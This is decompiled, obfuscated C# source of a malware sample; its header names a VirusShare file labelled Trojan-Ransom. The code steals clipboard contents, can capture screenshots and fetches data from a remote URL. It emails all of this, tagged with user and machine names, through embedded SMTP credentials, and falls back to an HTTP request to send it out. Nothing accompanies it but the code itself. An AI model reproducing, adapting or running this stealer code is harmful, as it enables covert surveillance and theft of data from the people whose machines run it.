// Decompiled with JetBrains decompiler
// Type: .
// Assembly: NclMSBTSrv, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 31999671-0B76-45C3-A8DB-31567EA9B9E0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Foreign.mwiv-8508fb8f5be70ff60be96c0c549c181c381d492bafeeaca55bd62d220f8cd03b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

namespace \u0001
{
  internal class \u0003
  {
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static string \u0007;
    public static string \u0008;
    public static string \u000E;
    public static string \u000F;
    public static string \u0010;
    public static string \u0011;
    public static int \u0001;
    public static string \u0012;
    public static string \u0013;
    public static string \u0014;
    public static string \u0015;
    public static int \u0002;
    public static int \u0003;
    public static string \u0016;
    public static string \u0017;
    public static string \u0018;
    public static string \u0019;
    public static string \u001A;
    public static string \u001B;
    public static string \u001C;
    public static string \u001D;
    public static string \u001E;
    public static \u0005.\u0001 \u0001;
    [NonSerialized]
    internal static \u0004.\u0003 \u007F;

    static \u0003()
    {
      System.Type type = typeof (\u0001.\u0003);
      if (true)
        goto label_6;
label_1:
      int num = 0;
      if (num == 0)
      {
        \u0001.\u0003.\u0001 = num;
        \u0001.\u0003.\u0012 = (string) null;
        \u0001.\u0003.\u0013 = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1794), \u0001.\u0003.\u007F(502));
        \u0001.\u0003.\u0014 = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1851), \u0001.\u0003.\u007F(502));
        \u0001.\u0003.\u0015 = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1884), \u0001.\u0003.\u007F(502));
        \u0001.\u0003.\u0002 = 587;
        num = 1800000;
      }
      \u0001.\u0003.\u0003 = num;
      \u0001.\u0003.\u0016 = (string) null;
      if (true)
        \u0001.\u0003.\u0017 = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1913), \u0001.\u0003.\u007F(502));
      \u0001.\u0003.\u0018 = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1926), \u0001.\u0003.\u007F(502));
      \u0001.\u0003.\u0019 = \u0001.\u0003.\u007F(1939);
      \u0001.\u0003.\u001A = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1952), \u0001.\u0003.\u007F(502));
      \u0001.\u0003.\u001B = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1965), \u0001.\u0003.\u007F(502));
      \u0001.\u0003.\u001C = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1978), \u0001.\u0003.\u007F(502));
      \u0001.\u0003.\u001D = (string) null;
      \u0001.\u0003.\u001E = (string) null;
      return;
label_6:
      \u0003.\u0003.\u0001(type);
      goto label_1;
    }

    [STAThread]
    public static void \u0001()
    {
      try
      {
        \u0001.\u0003.\u0016 = \u0006.\u0001.\u0001().Clipboard.GetText();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        int millisecondsTimeout = \u0001.\u0003.\u0001;
        if (true)
          Thread.Sleep(millisecondsTimeout);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (true)
        {
          if (true)
            \u0004.\u0005.\u0001();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (true)
          \u0004.\u0005.\u0001();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread thread1;
        do
        {
          Thread thread2 = new Thread(new ThreadStart(\u0004.\u0005.\u0001));
          if (true)
            goto label_16;
label_13:
          continue;
label_16:
          thread1 = thread2;
          goto label_13;
        }
        while (false);
        Thread thread3 = thread1;
        if (true)
          goto label_17;
label_15:
        Thread thread4 = thread1;
        if (true)
        {
          thread4.Start();
          goto label_20;
        }
        else
          goto label_20;
label_17:
        thread3.IsBackground = true;
        goto label_15;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_20:
      try
      {
        \u0001.\u0003.\u0001 = new \u0005.\u0001(\u0001.\u0003.\u001E);
        \u0004.\u0005.\u0001();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread thread;
        do
        {
          thread = new Thread(new ThreadStart(\u0001.\u0003.\u0002));
          thread.IsBackground = true;
        }
        while (false);
        thread.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new Thread(new ThreadStart(\u0004.\u0005.\u0001))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new Thread(new ThreadStart(\u0004.\u0005.\u0001))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread thread;
        do
        {
          thread = new Thread(new ThreadStart(\u0004.\u0005.\u0001));
          thread.IsBackground = true;
        }
        while (false);
        thread.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0004.\u0005.\u0001();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0004.\u0005.\u0001();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new Thread(new ThreadStart(\u0004.\u0005.\u0001))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new Thread(new ThreadStart(\u0004.\u0005.\u0001))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().WaitForExit();
    }

    public static void \u0002()
    {
      if (true)
        goto label_31;
label_1:
      if (true)
        goto label_32;
label_2:
      if (true)
        goto label_33;
label_3:
      if (true)
        goto label_34;
label_4:
      string newLine = Environment.NewLine;
      if (true)
        goto label_35;
label_5:
      WebClient webClient1 = new WebClient();
      if (true)
        goto label_36;
label_6:
      string str1;
      string str2;
      WebClient webClient2;
      string str3;
      bool flag;
      int num;
      while (true)
      {
        Thread.Sleep(\u0001.\u0003.\u0003);
        try
        {
          str2 = \u0001.\u0003.\u007F(2003) + str1 + str1 + \u0001.\u0003.\u0016 + str1 + str1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(100);
        try
        {
          str3 = \u0001.\u0003.\u007F(2036) + str1 + str1 + webClient2.DownloadString(\u0004.\u0005.\u0001(\u0001.\u0003.\u007F(2061), \u0001.\u0003.\u007F(502))) + str1 + str1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(500);
        try
        {
          if (Operators.CompareString(\u0001.\u0003.\u001E, (string) null, false) != 0)
          {
            string[] strArray = new string[6]
            {
              \u0001.\u0003.\u001E,
              str1,
              str1,
              str3,
              str1,
              null
            };
            do
            {
              strArray[5] = str2;
            }
            while (false);
            \u0001.\u0003.\u001D = string.Concat(strArray);
            try
            {
              MailMessage message = new MailMessage();
              MailMessage mailMessage = message;
              mailMessage.From = new MailAddress(\u0001.\u0003.\u0013);
              mailMessage.To.Add(\u0001.\u0003.\u0013);
              mailMessage.Subject = \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(2150), \u0001.\u0003.\u007F(502)) + Environment.UserName.ToString() + \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1258), \u0001.\u0003.\u007F(502)) + Environment.MachineName.ToString();
              mailMessage.Body = \u0001.\u0003.\u001D;
              if (flag)
              {
                try
                {
                  Rectangle bounds = Screen.PrimaryScreen.Bounds;
                  Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                  Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                  bitmap.Save(Path.GetTempPath() + \u0001.\u0003.\u007F(2191) + num.ToString() + \u0001.\u0003.\u007F(2196));
                  Attachment attachment = new Attachment(Path.GetTempPath() + \u0001.\u0003.\u007F(2191) + num.ToString() + \u0001.\u0003.\u007F(2196));
                  mailMessage.Attachments.Add(attachment);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              SmtpClient smtpClient1 = new SmtpClient(\u0001.\u0003.\u0015);
              SmtpClient smtpClient2;
              while (true)
              {
                smtpClient2 = smtpClient1;
                smtpClient2.Port = \u0001.\u0003.\u0002;
                if (true)
                {
                  smtpClient2.EnableSsl = true;
                  break;
                }
              }
              smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(\u0001.\u0003.\u0013, \u0001.\u0003.\u0014);
              smtpClient2.Send(message);
              checked { ++num; }
              smtpClient2 = (SmtpClient) null;
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              try
              {
                HttpWebResponse response = (HttpWebResponse) WebRequest.Create(\u0001.\u0003.\u007F(1680) + \u0001.\u0003.\u007F(1745) + \u0001.\u0003.\u0013 + \u0001.\u0003.\u007F(1754) + Strings.Replace(\u0004.\u0005.\u0001(\u0001.\u0003.\u007F(2150), \u0001.\u0003.\u007F(502)) + Environment.UserName.ToString() + \u0004.\u0005.\u0001(\u0001.\u0003.\u007F(1258), \u0001.\u0003.\u007F(502)) + Environment.MachineName.ToString(), \u0001.\u0003.\u007F(524), \u0001.\u0003.\u007F(1767)) + \u0001.\u0003.\u007F(1772) + Strings.Replace(\u0001.\u0003.\u001D, \u0001.\u0003.\u007F(524), \u0001.\u0003.\u007F(1767)) + \u0001.\u0003.\u007F(1785) + \u0001.\u0003.\u0013).GetResponse();
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              do
              {
                ProjectData.ClearProjectError();
              }
              while (false);
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0001.\u0003.\u001D = (string) null;
        \u0001.\u0003.\u001E = (string) null;
        \u0001.\u0003.\u0012 = (string) null;
      }
label_36:
      webClient2 = webClient1;
      goto label_6;
label_35:
      str1 = newLine;
      goto label_5;
label_34:
      flag = false;
      goto label_4;
label_33:
      num = 0;
      goto label_3;
label_32:
      str3 = (string) null;
      goto label_2;
label_31:
      str2 = (string) null;
      goto label_1;
    }
  }
}
